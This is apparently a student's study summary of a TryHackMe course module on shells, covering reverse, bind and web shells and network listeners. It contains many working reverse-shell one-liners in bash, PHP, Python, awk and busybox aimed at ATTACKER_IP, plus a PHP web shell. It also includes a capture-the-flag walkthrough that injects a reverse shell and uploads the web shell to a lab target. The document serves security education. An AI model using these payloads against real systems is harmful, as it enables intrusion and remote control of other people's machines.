# 🛡️ TryHackMe — Cybersecurity 101

## Module: Shell Overview | Study Summary

> **Keywords:** Shell · Reverse Shell · Bind Shell · Web Shell · Netcat · Listeners · Shell Payloads · Command Injection · File Upload

---

## 📚 Table of Contents

1. [What is a Shell](#1-what-is-a-shell)
2. [Reverse Shell](#2-reverse-shell)
3. [Bind Shell](#3-bind-shell)
4. [Reverse vs Bind — Key Differences](#4-reverse-vs-bind--key-differences)
5. [Shell Listeners](#5-shell-listeners)
6. [Shell Payloads](#6-shell-payloads)
7. [Web Shell](#7-web-shell)
8. [Practical Lab Notes](#8-practical-lab-notes)
9. [Quick Reference Cheatsheet](#9-quick-reference-cheatsheet)

---

## 1. What is a Shell

A shell is **software that allows a user to interact with an OS**. It can be a graphical interface but is usually a command-line interface (CLI).

In cybersecurity, "getting a shell" refers to a specific shell session an attacker establishes on a compromised system, allowing them to run commands and execute software remotely.

### What an Attacker Can Do With a Shell

| Activity                  | Description                                                                                 |
| ------------------------- | ------------------------------------------------------------------------------------------- |
| **Remote System Control** | Execute commands or software remotely on the target system.                                 |
| **Privilege Escalation**  | If initial shell access is limited, explore ways to escalate to administrative privileges.  |
| **Data Exfiltration**     | Read and copy sensitive data from the target system.                                        |
| **Persistence**           | Create backdoor users, credentials, or copy malware to maintain long-term access.           |
| **Post-Exploitation**     | Deploy malware, create hidden accounts, delete logs, etc.                                   |
| **Pivoting**              | Use the compromised shell as a launch point to reach other systems on the internal network. |

---

## 2. Reverse Shell

A reverse shell (also called "connect back shell") is one of the most popular techniques for gaining access to a system. The **connection initiates from the target back to the attacker's machine**, helping avoid detection from firewalls (which usually block incoming connections but allow outgoing ones).

### How It Works

```
Attacker machine          Target machine
[nc listener] ←——————— [reverse shell payload executes]
     ↑                          ↑
waits for connection      exploits vulnerability,
on port 443               connects back to attacker
```

### Step 1 — Set Up the Listener (Attacker)

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```

| Flag | Meaning                                    |
| ---- | ------------------------------------------ |
| `-l` | Listen mode — wait for incoming connection |
| `-v` | Verbose output                             |
| `-n` | No DNS resolution — use IP addresses only  |
| `-p` | Port to listen on                          |

> 💡 Attackers commonly use ports **53, 80, 443, 8080, 139, 445** to blend reverse shell traffic with legitimate-looking traffic and evade detection.

### Step 2 — Execute the Payload (Target)

Example: **Pipe Reverse Shell**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

| Part                     | What it does                                                        |
| ------------------------ | ------------------------------------------------------------------- |
| `rm -f /tmp/f`           | Removes any existing named pipe at `/tmp/f` to avoid conflicts      |
| `mkfifo /tmp/f`          | Creates a named pipe (FIFO) for bidirectional communication         |
| `cat /tmp/f`             | Reads data from the pipe — waits for attacker's commands            |
| `\| sh -i 2>&1`          | Pipes input into an interactive shell; `2>&1` sends errors back too |
| `\| nc ATTACKER_IP PORT` | Sends shell output to attacker via Netcat                           |
| `>/tmp/f`                | Feeds output back into the pipe — creates the bidirectional loop    |

### Step 3 — Attacker Receives the Shell

```bash
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964

target@tryhackme:~$
```

---

## 3. Bind Shell

A bind shell **opens a port on the compromised target and waits for the attacker to connect**. The attacker initiates the connection. Less common than reverse shells because the open listening port is easier to detect, but useful when the target blocks outgoing connections.

### How It Works

```
Attacker machine          Target machine
[nc connect] ——————————→ [bind shell listening on port 8080]
     ↑                          ↑
initiates connection      executes payload,
to target                 opens port, waits
```

### Step 1 — Execute Payload on Target (Opens the Listener)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

| Part                 | What it does                                              |
| -------------------- | --------------------------------------------------------- |
| `nc -l 0.0.0.0 8080` | Starts Netcat in listen mode on all interfaces, port 8080 |
| `0.0.0.0`            | Listens on all available network interfaces               |

> ⚠️ Ports below 1024 require elevated privileges to bind. Port 8080 avoids this requirement.

### Step 2 — Attacker Connects to the Bind Shell

```bash
attacker@kali:~$ nc -nv TARGET_IP 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

---

> ![Reverse Shell vs Bind Shell comparison diagram](file:///C:/Users/LENOVO/Pictures/Typedown/8b5dadd2-4191-4215-bfe6-ce3a2b2de967.png)
> *Diagram: Reverse Shell vs Bind Shell — connection direction comparison*

---

## 4. Reverse vs Bind — Key Differences

|                                  | Reverse Shell                                   | Bind Shell                                  |
| -------------------------------- | ----------------------------------------------- | ------------------------------------------- |
| **Who initiates the connection** | Target connects to attacker                     | Attacker connects to target                 |
| **Listener location**            | Attacker's machine                              | Target machine                              |
| **Firewall evasion**             | ✅ Better — outgoing connections usually allowed | ❌ Worse — open port on target is detectable |
| **Use case**                     | Standard — most common technique                | When target blocks outgoing connections     |
| **Detection risk**               | Lower                                           | Higher — open listening port is suspicious  |

---

## 5. Shell Listeners

Netcat is the standard listener, but other tools offer additional capabilities:

### Netcat (`nc`)

The classic utility. Reads and writes through a network connection.

```bash
nc -lvnp 443
```

### Rlwrap

A small wrapper around Netcat that adds **readline support** — enables arrow keys, command history, and line editing in the shell session. Makes raw Netcat shells much more usable.

```bash
rlwrap nc -lvnp 443
```

### Ncat

An improved version of Netcat distributed by the **Nmap project**. Key addition: **SSL encryption** for the shell connection.

```bash
# Standard listener
ncat -lvnp 443

# With SSL encryption
ncat --ssl -lvnp 443
```

> 🔗 [Ncat Documentation](https://nmap.org/ncat)

### Socat

A utility for creating socket connections between two data sources. More powerful and flexible than Netcat.

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

| Part             | Meaning                               |
| ---------------- | ------------------------------------- |
| `-d -d`          | Double verbose (increased verbosity)  |
| `TCP-LISTEN:443` | Creates a TCP listener on port 443    |
| `STDOUT`         | Directs incoming data to the terminal |

> 🔗 [Socat Documentation](https://linux.die.net/man/1/socat)

---

## 6. Shell Payloads

A shell payload is a **command or script that exposes or connects a shell over the network**. In a reverse shell, the payload runs on the target and connects back to the attacker. In a bind shell, it opens a port on the target.

The payload to use depends on what tools and languages are available on the compromised target system.

> 🔗 [Reverse Shell Cheat Sheet — pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

### Bash Payloads

**Normal Bash Reverse Shell**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

Opens an interactive bash shell and redirects all I/O through a TCP connection. `>&` combines stdout and stderr.

---

**Bash Read Line Reverse Shell**

```bash
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```

Creates file descriptor `5` connected to the TCP socket. Reads commands line by line and executes them, sending output back through the same socket.

---

**Bash With File Descriptor 196**

```bash
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```

Uses file descriptor `196` to establish the TCP connection. Redirects stdin, stdout, and stderr all through it.

---

**Bash With File Descriptor 5**

```bash
bash -i 5<>/dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

Similar to the normal bash shell but uses file descriptor `5` explicitly for all I/O.

---

### PHP Payloads

All PHP payloads below use `fsockopen()` to create the socket connection. They differ only in the PHP function used to execute the shell command:

**Using `exec`**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

**Using `shell_exec`**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```

**Using `system`**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```

Executes the command and outputs the result directly to the browser.

**Using `passthru`**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```

Sends raw output back — useful for binary data.

**Using `popen`**

```bash
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
```

Opens a process file pointer to execute the shell.

---

### Python Payloads

> Note: all Python payloads below require `python -c` to run (indicated by `PY-C` placeholder in the original material).

**By Exporting Environment Variables**

```bash
export RHOST="ATTACKER_IP"; export RPORT=443
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Sets remote host/port as environment variables, creates socket, duplicates file descriptors for stdin/stdout/stderr.

---

**Using the subprocess Module**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

---

**Short Python Reverse Shell**

```bash
python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

Most compact version — same mechanism, fewer characters.

---

### Other Payloads

**Telnet**

```bash
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```

Creates a named pipe and connects via Telnet instead of Netcat.

**AWK**

```bash
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

Uses AWK's built-in TCP capabilities. Connects to attacker, reads and executes commands, sends results back.

**BusyBox**

```bash
busybox nc ATTACKER_IP 443 -e sh
```

Uses BusyBox's Netcat implementation with `-e sh` to expose a shell. Very useful on minimal embedded Linux systems where only BusyBox is available.

---

## 7. Web Shell

A web shell is a **script written in a web server-supported language** (PHP, ASP, JSP) that executes OS commands through the web server itself. It is uploaded to the target server by exploiting vulnerabilities and then accessed via URL.

### Example — Minimal PHP Web Shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Save as `shell.php`, upload to the server, then access via:

```
http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=cat /etc/passwd
```

### How Web Shells Are Uploaded

- [Unrestricted File Upload vulnerability](https://tryhackme.com/r/room/uploadvulns)
- [File Inclusion vulnerability](https://tryhackme.com/r/room/fileinc)
- [Command Injection vulnerability](https://tryhackme.com/r/room/oscommandinjection)
- Unauthorized access to the server

### Popular Web Shells Available Online

| Shell                                                  | Language | Description                                             |
| ------------------------------------------------------ | -------- | ------------------------------------------------------- |
| [p0wny-shell](https://github.com/flozz/p0wny-shell)    | PHP      | Minimalistic single-file shell with terminal-like GUI   |
| [b374k shell](https://github.com/b374k/b374k)          | PHP      | Feature-rich: file manager, command execution, and more |
| [c99 shell](https://www.r57shell.net/single.php?id=13) | PHP      | Well-known robust shell with extensive functionality    |

> 🔗 More web shells: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php)

---

## 8. Practical Lab Notes

### Lab Setup

- **Attacker IP:** `10.64.70.202`
- **Target IP:** `10.64.151.213`
- Port `8081` → vulnerable to **command injection**
- Port `8082` → vulnerable to **unrestricted file upload**

---

### Challenge 1 — Reverse Shell via Command Injection (port 8081)

```bash
# Step 1: Start listener on attacker
nc -lvnp 443

# Step 2: In the browser dialog at http://10.64.151.213:8081
# inject the pipe reverse shell payload:
; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.64.70.202 443 >/tmp/f

# Step 3: On the attacker (shell received)
ls /
cat /flag.txt
```

**Flag 1:** `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`

---

### Challenge 2 — Web Shell via Unrestricted File Upload (port 8082)

```bash
# Step 1: Create the PHP web shell
nano shell.php
```

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

```bash
# Step 2: Upload shell.php through the file upload form at http://10.64.151.213:8082

# Step 3: Verify it works
# http://10.64.151.213:8082/uploads/shell.php?cmd=whoami
# → returns: www-data  ✅

# Step 4: Read the flag directly via URL
# http://10.64.151.213:8082/uploads/shell.php?cmd=cat /flag.txt
```

**Flag 2:** `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

---

## 9. Quick Reference Cheatsheet

### Setting Up Listeners

```bash
# Netcat (standard)
nc -lvnp 443

# Netcat with readline support
rlwrap nc -lvnp 443

# Ncat with SSL
ncat --ssl -lvnp 443

# Socat
socat -d -d TCP-LISTEN:443 STDOUT
```

### Quick Payload Selection Guide

```
Target has bash?      → Use bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
Target has PHP?       → Use php -r '$sock=fsockopen(...)...'
Target has Python?    → Use python -c 'import socket...'
Target is minimal?    → Use busybox nc ATTACKER_IP 443 -e sh
Target is a web app?  → Upload a web shell (shell.php)
Target blocks egress? → Use bind shell instead of reverse shell
```

### Key Terminology

| Term                  | Definition                                                                                                                |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| **Shell**             | Interface to interact with an OS via commands. In pentesting, a remote command execution session on a compromised system. |
| **Reverse shell**     | Target connects back to attacker. Attacker listens, target executes payload.                                              |
| **Bind shell**        | Target opens a port and waits. Attacker connects to target.                                                               |
| **Web shell**         | A script (usually PHP) uploaded to a web server that executes OS commands via HTTP requests.                              |
| **Listener**          | A tool (Netcat, Ncat, Socat) waiting on a port for an incoming shell connection.                                          |
| **Payload**           | The command or script executed on the target to expose or connect the shell.                                              |
| **Pivoting**          | Using a compromised shell as a launch point to attack other systems on the same internal network.                         |
| **Named pipe / FIFO** | A Linux IPC mechanism used in shell payloads (`mkfifo`) to enable bidirectional communication between processes.          |
| **`/dev/tcp`**        | A bash feature that allows opening TCP connections as if they were files — used in bash reverse shell payloads.           |

---

## 📝 My Notes & Questions

> ### ¿Cuándo usar cada payload?
> 
> La respuesta corta es: **usas el que funcione según lo que tenga instalado el sistema comprometido**. No eliges el que prefieres — eliges el que puedes usar.
> 
> La lógica de decisión es esta:
>     ¿Qué tiene disponible el target?
>     ├── bash disponible?     → bash -i >& /dev/tcp/...
>     ├── PHP disponible?      → php -r '$sock=fsockopen(...)'
>     ├── Python disponible?   → python -c 'import socket...'
>     ├── Sistema muy mínimo?  → busybox nc ATTACKER_IP 443 -e sh
>     └── Es un servidor web?  → web shell (shell.php)
> 
> En la práctica, cuando entras a un sistema Linux típico, lo primero que intentas es el payload de bash porque casi siempre está disponible. Si falla, pruebas Python, luego PHP, y así sucesivamente.
> 
> * * *
> 
> ### ¿Por qué hay tantas variantes del mismo payload?
> 
> Porque los servidores y los sistemas defensivos pueden tener **funciones específicas deshabilitadas o bloqueadas**. Por ejemplo, en PHP:
> 
> * Algunos servidores deshabilitan `exec()` por razones de seguridad
> * Otros deshabilitan `system()` pero dejan `passthru()` activo
> * Otros bloquean `shell_exec()` pero no `popen()`
> 
> Todas hacen esencialmente lo mismo — ejecutar un comando de shell — pero usan mecanismos internos distintos. Si una está bloqueada, pruebas la siguiente. Es la misma razón por la que hay 4 variantes de bash: distintos entornos tienen distintas restricciones sobre cómo se pueden usar los file descriptors.
> 
> * * *
> 
> ### ¿Los debes aprender de memoria o los buscas en algún lado?
> 
> **Los buscas.** Nadie los memoriza. Lo que sí debes entender es el concepto detrás de cada uno para saber cuál aplicar en cada situación — pero la sintaxis exacta siempre se consulta.
> 
> Los recursos estándar que todo pentester tiene guardados son:
> 
> * **[pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)** — el más clásico, referenciado en el propio módulo
> * **[revshells.com](https://www.revshells.com)** — introduces tu IP y puerto y te genera el payload listo para copiar en el lenguaje que elijas
> * **[PayloadsAllTheThings en GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)** — repositorio enorme con payloads para casi cualquier escenario imaginable
> 
> En un pentest real abres una de esas referencias, identificas qué tiene el target, copias el payload correcto, reemplazas `ATTACKER_IP` y `PORT` con tus datos, y lo ejecutas. La habilidad está en saber cuál elegir y por qué, no en escribirlos de memoria.

---

*TryHackMe — Cybersecurity 101 | Shell Overview*
